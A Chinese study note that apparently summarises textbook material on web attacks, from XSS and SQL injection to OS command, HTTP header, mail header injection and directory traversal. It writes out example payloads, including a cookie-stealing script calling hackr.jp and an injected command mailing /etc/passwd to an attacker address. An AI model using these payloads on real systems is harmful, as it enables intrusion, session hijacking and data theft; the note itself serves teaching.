# Web 攻击

目录

- [原因](#原因)
- [攻击方式](#攻击方式)
    - [跨站脚本攻击 XSS](#跨站脚本攻击-xss)
    - [对用户 Cookie 的窃取攻击](#对用户-cookie-的窃取攻击)
    - [SQL 注入攻击](#sql-注入攻击)
    - [OS 命令注入攻击](#os-命令注入攻击)
    - [HTTP 首部注入攻击](#http-首部注入攻击)
    - [HTTP 响应截断攻击](#http-响应截断攻击)
    - [邮件首部注入攻击](#邮件首部注入攻击)
    - [目录遍历攻击](#目录遍历攻击)

## 原因

- HTTP 不具备安全功能
- 在客户端可以篡改请求

## 攻击方式

### 跨站脚本攻击 XSS

通过提交的信息中带入 js 脚本，执行操作或者引入三方 js 。

正常请求：<br />
http: //example.jp/login?ID="haha"<br />
正常显示：<br />
&lt;input type="text" name="ID" value="yama" />

攻击请求：<br />
http: //example.jp/login?ID=">&lt;script>var+f=document.getElementById("login");&lt;/script>"<br />
攻击显示：<br />
&lt;input type="text" name="ID" value="">&lt;script>var+f=document.getElementById("login");&lt;/script>

### 对用户 Cookie 的窃取攻击

恶意三方脚本执行。

如下：<br />
var content = escape(document.cookie);<br />document.write("&lt;img src=http: //hackr.jp/?");<br />document.write(content);<br />document.write(">");<br />

### SQL 注入攻击

正常请求：<br />
http: //example.jp/search?q=haha<br />
正常执行：<br />
SELECT * FROM bookTbl WHERE author = 'haha' and flag = 1;

攻击请求：<br />
http: //example.jp/search?q=haha‘ --<br />
攻击显示：<br />
SELECT * FROM bookTbl WHERE author = 'haha' --’ and flag = 1;<br />
flag = 1 的条件被忽略

### OS 命令注入攻击

核心代码：<br />
my $adr = $q->param('mailaddress');<br />open(MAIL, "| /usr/sbin/sendmail $adr");<br />print MAIL "From: info@example.com\n";<br />

当传入 mailaddress 参数为 ; cat /etc/passwd | mail hack@example.jp

会执行下面的语句：<br />
| /usr/sbin/sendmail ; cat /etc/passwd | mail hack@example.jp<br />
将含有 Linux 账户信息 /etc/passwd 的文件，就以邮件形式发送给了 hack@example.jp。

### HTTP 首部注入攻击

http 头部信息：<br />
Location: http: //www.example.com/a.cgi?q=101%0D%0ASet-Cookie:+SID=123456789

%0D%0A 代表 HTTP 报文中的换行符，紧接着的是可强制将攻击者网站（http: //hackr.jp/）的会话 ID 设置成 SID=123456789 的 Set-Cookie 首部字段。首部字段 Set-Cookie 已生效，因此攻击者可指定修改任意的 Cookie 信息。通过和会话固定攻击（攻击者可使用指定的会话 ID）攻击组合，攻击者可伪装成用户。

### HTTP 响应截断攻击

HTTP 响应截断攻击是用在 HTTP 首部注入的一种攻击。攻击顺序相同，但是要将两个 %0D%0A%0D%0A 并排插入字符串后发送。利用这两个连续的换行就可作出 HTTP 首部与主体分隔所需的空行了，这样就能显示伪造的主体，达到攻击目的。这样的攻击叫做 HTTP 响应截断攻击。

如下：<br />
Set-Cookie: UID=（%0D%0A ：换行符）<br />（%0D%0A ：换行符）<br />&lt;HTML>&lt;HEAD>&lt;TITLE>之后，想要显示的网页内容 &lt;!--（原来页面对应的首部字利

### 邮件首部注入攻击

bob@hackr.jp%0D%0ABcc: user@example.com

%0D%0A 在邮件报文中代表换行符。一旦咨询表单所在的 Web 应用接收了这个换行符，就可能实现对 Bcc 邮件地址的追加发送，而这原本是无法指定的。

bob@hackr.jp%0D%0A%0D%0ATest Message

使用两个连续的换行符就有可能篡改邮件文本内容并发送。

再以相同的方法，就有可能改写 To 和 Subject 等任意邮件首部，或向文本添加附件等动作。

### 目录遍历攻击

http: //example.com/read.php?log=../../etc/passwd

查询字段为了读取攻击者盯上的 /etc/passwd 文件，会从 /www/log/ 目录开始定位相对路径。如果这份 read.php 脚本接受对指定目录的访问请求处理，那原本不公开的文件就存在可被访问的风险。